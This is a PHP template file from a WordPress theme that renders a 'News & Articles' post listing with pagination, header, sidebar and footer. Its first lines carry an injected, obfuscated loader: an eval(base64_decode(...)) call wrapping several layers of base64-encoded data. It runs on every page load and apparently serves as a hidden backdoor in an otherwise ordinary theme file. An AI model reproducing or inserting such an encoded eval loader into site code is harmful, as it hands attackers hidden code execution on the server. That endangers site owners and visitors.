<?php ob_start(); ?>
<? eval(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtGcFlXbWhpUTJocFdWaE9iRTVxVW1aYVIxWnFZakpTYkV0R2NGbFhiV2hwVVRKb2NGZFdhRTlpUlRWeFZXMWFZVkl4V25GWmFrcFRZa1YwUm1WRVZsQlNSMmhTVkZSQ1MyUnNhM2RTV0dSVVRVVTFXVmxyWTNoVVJrbDRZak5vV21KVVJsQlVWV1JIVjBVNVdWWnNiRTVpUm10M1YxWmFiMVF3TVVoVWFsWmhUV3BXWVZSVVJtRk9WbXh5VjFSV2FsSXdjREJaYTFKRFV6SldXR1JJWkZOU2Exb3lWVEl4VjAwd01VWmtSVkpXVmpOU2VWZHJXbTlUTWsxM1lrVldUbEl5VWt0WmJHUnVaREZ3Um1GRlNrOWhNMmN4VkRCU1YxUnNWalpWYWxaVlYwaENlVnBHVlhoV1ZscFpWbXM1YUdFeFdYbFhWbU40VWpBeGMySkdVbEJXZWxad1ZGZHdjMlJXYkhKYVJscHJWakExU1ZsVmFHdFRiVVoxVkcwMVUxSnJXakpWTW5SUFZrWldkR05IYUZKTlJWVXhWVEZXYTFRd01WaFVibEpzVWpGd2IxWnVjRmRrTVhCR1ZHMDFhbEpVYXpGVlZtUnJVbFpXV0U5VmRGSk5WVFZVVkZWa1IxZEZNVmhsUjJ4T1RWWnNNMVV4VmxKa01XOTNUbFpXYWsxdFVrdFZWbEpEVkVaRmVGSnVUbWhpVmtwYVZUSTFUMWRWTUhkT1dFNWhVbGROTVZwRVNsTlNSbTk1WkVad1RtSlhValpXVmxKSFZqRlZlRlZyV2xCV2ExcFlWVzF3YzFZeFdsaGtSRTVxVFVoQ1NsWnROWE5o.VmtWNVkzcE9WRlpWVmpOVmVrSlBWVzFLU0dOSGRGaFNXRUkyVmpCU1QxUXlTa2hWYTJoUVYwZFNjbFZVU210amJHUlZVMjAxYWsxVlZqUldiWGhQVmxaS1ZXSkdTbGRoTVdzeFZsUkdTMVl4Vm5OWGJGcG9aV3hhVjFac1pEQlNNVkY0Vmxoa1dHRXhjRmRaVm1oclRrWk5lRlZ1Y0dGTlJrcFRXV3BDZDFKR1dYZE9TR2hhVFdwRk1GZHRNVTVsVmxweFVXMXNUazFGYkROVmVrSlBWVEpHZEZKclVteFNWa3BZVm0xMGQxUnNXa1ZTYTA1WC5WbTFrTTFaSGVFTldWMFkyVm10a1ZsWkZXbFJXYkZwUFZtc3hWbGRzVms1V2JIQlhWa1ZXVDFVd01VaFNiR2hPVmpOb2NGUlVSbHBrTVUxNFZXNXdZVTFHU2xOWmFrSjNVa1pWZUZOdVNsaFdiV2hVV1ZWV2MxSlZNVWhhUm5CT1RWWnZNVmRYZEZwT1YwcElWbXRvVjJKWVFrMVZWRVpMWTFac1ZsUnVTazlOUjNoRlZWWlZNVkpHYjNsa1JYUllWa1UxV0ZwV1pFdFNNRGxZWTBkc1UyVnRkekpXTW5oUFltMUZlR0V6YkdGTk1FcFJXbFpXUjFReFJYbGFTRXBVWWtoQ1dWWkhNRFZoVjFaV1VtNUNWR0V5VWxSWlZXUlRVMFpLV0dKR1FtdGxhMHBOVlZSR2JtUXhVbkpVYmtKUVUwWndVaTVhVjNCVFZERkZlVmt6UWt4V1NFMXdTMVJ6S1NrNykpOw)); ?>
<?php 
	######### REQUIRE HEADER FILE #########
	get_header();
?>                
				<section class="grid_10">
                	<h3 class="page-title">News &amp; Articles</h3>
					<?php $posts = query_posts($query_string.'&cat=7'); ?>
                    <?php if (have_posts()) : while (have_posts()) : the_post(); ?>
                    
                    <div class="post-item">
                    	<h4><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h4>
                        <small><?php the_time('F j, Y'); ?></small>
                     	<?php the_excerpt('...Read More'); ?>
                    </div>
                    
                    <?php endwhile; ?>
                    <?php my_paginate_links(); ?>
                    <?php else : ?>
                    <p>Cannot find any posts at the moment.</p>
                    <?php endif; ?>
                    
                </section>
<?php 
	get_sidebar();  
	get_footer();
?>                                                                                                                                                                                                                                                                                                   